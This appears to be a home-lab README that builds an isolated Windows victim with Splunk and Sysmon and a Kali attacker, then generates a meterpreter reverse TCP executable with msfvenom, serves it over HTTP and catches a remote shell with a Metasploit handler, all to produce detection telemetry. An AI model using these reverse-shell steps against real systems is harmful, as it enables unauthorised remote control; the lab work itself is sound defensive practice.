# Setting up the Virtual Machines


## Configuring the network
To start, I set up a new isolated network within KVM. This will allow me to use my VMs on an network that is logically seperate from my host machine and the internet. I did this for safety to
minimize the risk of any unwanted traffic traversing outside of the virtuals machines.

<img width="1404" height="1067" alt="Screenshot_20251115_190221" src="https://github.com/user-attachments/assets/ba813885-55f9-4580-8b55-b4fd1f2ae879" />


## Setting Up The Windows 10 Victim Machine

### Setting up the Windows 10 Image

Using the Windows 10 Installation Media Creation Tool, created a Windows 10 ISO file

Set up the virtual machine in Oracle VMBox, walked through the installer

<img width="968" height="937" alt="Screenshot_20251115_160318" src="https://github.com/user-attachments/assets/34e0a816-4f4b-4790-b7ef-4e48b2a54f7c" />




I then configured each of the virtual machines to be attatched to this network. I'm using virtio as the network interface, since it's more CPU effecient than the alternatives, though it does
take a little more effort to set up (Namely in setting up the drivers necessary to make it work).

### Ensuring Driver compatability
The additional steps I took to set up virtio to work properly with my hypervisor were...
- For Windows...
-   Installing the virtio.win iso drivers from the official fedora linux repositories
-   Moving it to a suitable directory on my host
-   Attatching the drivers' iso file to the windows VM's SATA CDROM
-   Downloading the drivers to the windows VM itself
-  For Kali...
-    No additional configuration needed since it comes with all the necessary prerequisite drivers installed

<img width="1179" height="842" alt="Screenshot_20251115_193423" src="https://github.com/user-attachments/assets/d2f6e5a6-26cc-416f-93ea-2839a93d33f1" />

<img width="1997" height="1352" alt="Screenshot_20251116_144028" src="https://github.com/user-attachments/assets/6bd661a5-128f-41a8-ac6b-67b2ecc69944" />


### Statically Assigning The Machine's IP
Next, since I'm using these machines on an isolated network within KVM and they're only going to need to talk to each other, I got started with statically setting up each of their IP addresses with IPs that belong to private non routable subnets.

For the windows machine, I configured the following under the network adapter's properties

```shell
IP: 10.10.0.10
Subnet Mask: 255.255.255.0
```

<img width="2024" height="1355" alt="Screenshot_20251117_133815" src="https://github.com/user-attachments/assets/fcc447f5-e9f3-46e9-b275-e1530428a74d" />

(Verifying to ensure that the change went through)
<img width="2024" height="1355" alt="Screenshot_20251117_134222" src="https://github.com/user-attachments/assets/82b32e98-97d2-4d14-81e3-602443c05234" />


### Setting up SPLUNK

(I renamed the VM to Windows-Machine for the sake of convenience)

I had the installer downloaded on my host, and created a disk image of it that I mounted to the windows virtual machine to install.
(I'm running the free trial of SPLUNK enterprise)


Creating the image             |  Installing it 
:-------------------------:|:-------------------------:
<img width="1440" height="329" alt="Screenshot_20251118_150017" src="https://github.com/user-attachments/assets/e074edde-fe6e-435b-84ed-52dd84205906" /> |  <img width="2081" height="1353" alt="Screenshot_20251118_150526" src="https://github.com/user-attachments/assets/5abc3f62-4d9d-4fe5-a33b-bd79b4ef0053" />


After that point, I launched Splunk in my browser within the VM (Through localhost port 8000), and configured it by adding some basic data points to be monitored and uploaded to SPLUNK from the local event logs
<img width="1995" height="1367" alt="Screenshot_20251118_154458" src="https://github.com/user-attachments/assets/564f1445-1b4f-4526-aa66-854258674e0e" />



### Setting up Sysmon

I started up by downloading Sysmon on my host machine, alongside a pretty basic configuration file. The specific configuration file I used was one that I got here on Github: https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml
I had the sysmon setup and the associated files needed for it's configuration on a USB stick, so I directed it to my windows machine in the KVM settings

<img width="1006" height="220" alt="Screenshot_20260127_215045-1" src="https://github.com/user-attachments/assets/ab459bc9-a4d1-4c3a-b27f-e81173200995" />

Once that was done with, I placed all of my sysmon related files into my Windows machine's Documents folder before opening up Powershell as an administrator and navigating to the directory. I then ran a command to set up sysmon with the configuration file from above.

<img width="1594" height="1073" alt="Screenshot_20260127_215554-1" src="https://github.com/user-attachments/assets/62e434e3-3e81-4952-b024-170903f12a32" />

Once that was through, I wanted to double-check that the installation went through. to do so, I went over to the Windows Services pane, as well as the event viewer under Windows application events. Here, I saw Sysmon was showing up under both panels, so I knew i was good to go.

<img width="1678" height="1134" alt="Screenshot_20260127_215857-1" src="https://github.com/user-attachments/assets/5d514498-4ba2-420c-94ae-887058a9836a" />

To ensure that Splunk was set up to intake Sysmon's telemmetry, I first went into my Splunk directory and copied over the inputs.conf file from the defaults folder into the local folder. From there, 

## Setting up the Kali Machine

### Setting up the Kali Linux Image


### Statically Assigning The Kali VM's IP Address
To set up the Kali machine, I configured the following under the network properties.

```shell
IP: 10.10.0.11
Subnet Mask: 255.255.255.0
```

<img width="2011" height="1401" alt="Screenshot_20251117_134523" src="https://github.com/user-attachments/assets/0f520051-6f7b-4e3f-b8b5-c38cb511ed8d" />

# Testing out an attack

## Ensuring Connectivity
I started out by ensuring the two machines were able to connect to each other. I did so by pinging the Kali machine on my Windows machine
<img width="2018" height="1353" alt="image" src="https://github.com/user-attachments/assets/5b9994dd-9173-43a8-b52d-68f1777453c4" />
(NOTE that this wouldn't work the other way around, as Windows' firewall would block the traffic)

For this attack to go through, I'm going to want the Windows Remote Desktop Protocol port to be open, so I went into remote desktop settings and enabled the option
<img width="1992" height="1345" alt="image" src="https://github.com/user-attachments/assets/f011e8dd-55a4-438f-984f-8e3b63678543" />


Now that I'm ready for the attack to go through, I disabled the Windows Firewall on the victim machine through the control panel to allow for the sample attack to go through. I also disabled windows defender realtime virus protection so that the malware itself could run.

<img width="2014" height="1337" alt="image" src="https://github.com/user-attachments/assets/6913f7da-9e5d-46e4-8eba-7adc0c477ab7" />


## Scouting and Generating Malware

Using Nmap, I then ran a port scan on the Windows Victim machine (The -A flag was to scan everything, and the -pn flag was to skip pings in my output). 

<img width="1416" height="1162" alt="image" src="https://github.com/user-attachments/assets/f2ef3a07-417e-4a10-af19-aad7fecfd34e" />

Through this, I noticed that port 3389 (The port used for Microsoft RDP) was open. Given I know this is a reverse TCP port, I can use the command mfsvenom -l payloads | grep reverse_tcp to see any reverse tcp payloads that are available for use. Here, since the main goal is to get some tellemetry generated from SPLUNK and sysmon rather than an all-out attack being scaled on the Windows victim machine, I chose to use the windows/x64/meterpreter_reverse_tcp payload.

<img width="1561" height="344" alt="image" src="https://github.com/user-attachments/assets/b3a42568-ff85-4a5d-a1c7-2f19b4fefaff" />


With the payload in hand, the command msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.0.11 lport=4444 -f exe -o malware_file.exe can be used to generate the virus. Here, the meterpereter shell that is set to report back to the Kali machine's IP at the default meterpreter port (4444). The malware itself is saved to an exe file that we'll be sending over to our Windows machine,

<img width="1736" height="739" alt="image" src="https://github.com/user-attachments/assets/9a8b1119-1ae5-4103-8a91-df89a2256bd5" />

After that, I opened up metasploit and used the command use exploit/multi/handler to set up a listener for the malware we just created
<img width="1759" height="1226" alt="image" src="https://github.com/user-attachments/assets/bf0efd36-c3fa-455b-8f90-686a1ff00e9b" />

I then set the payload to the same one we're using, and set the lhost to the ip fof my machine, and used the exploit command to have my meterpreter shell start listening.
<img width="534" height="86" alt="image" src="https://github.com/user-attachments/assets/8fc3a159-ea5c-41d0-9443-fb07dec8cb92" />

## Getting The Malware Onto The Windows Machine

I set up an http server on the kali machine so that the malware could be downloaded on the windows machine (After moving the malware file itself to the documents folder for convenience sake)
<img width="1696" height="613" alt="image" src="https://github.com/user-attachments/assets/a2e9368b-e715-4f39-8496-d5a8baf776fc" />

I then connected to port 9999 on my kali machine using my windows machine's browser, and from there I was able to download the malware file
<img width="2084" height="1203" alt="image" src="https://github.com/user-attachments/assets/fdddf6dc-df34-42cf-a053-26f501026076" />

After downloading and running the malware, I can run the command netstat -anob in an admin enabled command prompt window to check for an established connection to the kali machine straight from the windows machine. And sure enough, it ends up showing up.
<img width="1799" height="1274" alt="image" src="https://github.com/user-attachments/assets/9c1da09a-1226-4a45-9b40-dafaa7fc25c0" />

Back in Kali, I can see my handler is recognizing this connection.

<img width="1182" height="453" alt="image" src="https://github.com/user-attachments/assets/35fdf88c-b2dd-4133-8868-394d84e705db" />


Using the shell command to establsih a shell on the windows machine, I typed in a few commands into the shell to be run on the Windows machine.
<img width="1876" height="1221" alt="image" src="https://github.com/user-attachments/assets/f5cc250c-e59c-4b29-aba2-325cb480fef4" />
